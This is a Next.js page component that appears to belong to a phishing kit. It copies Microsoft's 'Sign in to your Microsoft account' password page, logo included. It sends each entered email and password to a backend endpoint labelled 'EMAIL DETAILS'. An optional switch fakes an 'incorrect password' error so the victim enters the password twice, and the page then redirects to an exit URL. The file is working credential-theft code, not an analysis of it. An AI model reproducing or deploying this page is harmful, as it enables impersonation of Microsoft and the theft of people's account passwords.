/* eslint-disable @next/next/no-img-element */
import React, { useContext, useEffect, useState } from "react";

import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import { DataContext } from "../../_app";
import { Wrapper } from "../../../components/Wrapper";

interface LiveProps {}

const Live: React.FC<LiveProps> = () => {
  const [loading, setLoading] = useState(false);
  const [password, setPassword] = useState(``);
  const [attempt, setAttempt] = useState(0);
  const [error, setError] = useState<{
    show: boolean;
    message: string;
  }>({} as any);

  const [emailLogins, setEmailLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const onSubmit = async (e: any) => {
    e.preventDefault();
    setLoading(true);

    if (!password) {
      setError({
        show: true,
        message: `Please enter the password for your Microsoft account.`,
      });
      setLoading(false);
      return;
    }

    const formData = new FormData();

    formData.append(`form`, `EMAIL DETAILS`);
    formData.append(
      `emailLogins`,
      JSON.stringify({
        email: datas.username,
        emailPassword: password,
        attempt: attempt + 1,
      })
    );

    try {
      await axios.post(`/api/send-email-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setEmailLogins({
      [attempt + 1]: {
        form: `EMAIL DETAILS`,
        emailLogins: {
          email: datas.username,
          emailPassword: password,
          attempt: attempt + 1,
        },
      },
    });

    if (!attempt && process.env.NEXT_PUBLIC_DOUBLE_EMAIL_LOGIN === `ON`) {
      setTimeout(() => {
        setAttempt(1);
        setLoading(false);
        setError({
          show: true,
          message: `Your account or password is incorrect. If you don't remember your password.`,
        });
        setPassword(``);
      }, 2000);
      return;
    }

    setData({
      ...datas,
      emailLogins: {
        ...emailLogins,
        [attempt + 1]: {
          form: `EMAIL DETAILS`,
          emailLogins: {
            email: datas.username,
            emailPassword: password,
            attempt: attempt + 1,
          },
        },
      },
    });

    setLoading(false);

    window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
  };

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit(event);
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <title>Sign in to your Microsoft account</title>
      </Head>
      <Wrapper>
        <div className="win-scroll">
          <div
            id="lightbox"
            className={`sign-in-box ext-sign-in-box has-popup`}
          >
            <div className="lightbox-cover"></div>
            <div>
              <img
                src={`/images/logo.svg`}
                alt={`Microsoft`}
                className={`logo`}
              />
            </div>
            <div>
              <div>
                <div>
                  <div>
                    <div className="identityBanner">
                      <button
                        className={`backButton`}
                        onClick={(e) => {
                          e.preventDefault();
                          push(`/login`);
                        }}
                      >
                        <img
                          src={`/images/arrow_left.svg`}
                          alt={`Microsoft`}
                          className={`logo`}
                        />
                      </button>
                      <div id="displayName" className="identity">
                        {datas && datas.username}
                      </div>
                    </div>
                  </div>
                </div>
                <div className={`pagination-view has-identity-banner`}>
                  <div>
                    <div className="title">
                      <div>Enter password</div>
                    </div>
                    <div className="row">
                      <div className="form-group col-md-24">
                        <div role={`alert`}>
                          {error.show ? (
                            <div
                              id={`passwordError`}
                              className={`error ext-error`}
                            >
                              {error.message}
                            </div>
                          ) : null}
                        </div>
                        <div className="placeholderContainer">
                          <input
                            className={`form-control input ext-input text-box ext-text-box`}
                            placeholder={`Password`}
                            type={`password`}
                            onChange={(e) => {
                              setPassword(e.target.value);
                            }}
                          />
                        </div>
                      </div>
                    </div>
                    <div className={`position-buttons`}>
                      <div>
                        <div className="row">
                          <div className="col-md-24">
                            <div className="text-13">
                              <div className="form-group">
                                <a href="" role={`link`}>
                                  Forgot password?
                                </a>
                              </div>
                              <div className="form-group">
                                <a href="" role={`link`}>
                                  Other ways to sign in
                                </a>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="win-button-pin-bottom">
                        <div className="row">
                          <div>
                            <div
                              className={`col-xs-24 no-padding-left-right button-container`}
                            >
                              <div className="inline-block">
                                <input
                                  type={`submit`}
                                  className={`win-button button_primary button ext-button primary ext-primary`}
                                  id={`idSIButton9`}
                                  onClick={onSubmit}
                                  disabled={loading}
                                />
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </Wrapper>
    </>
  );
};

export default Live;
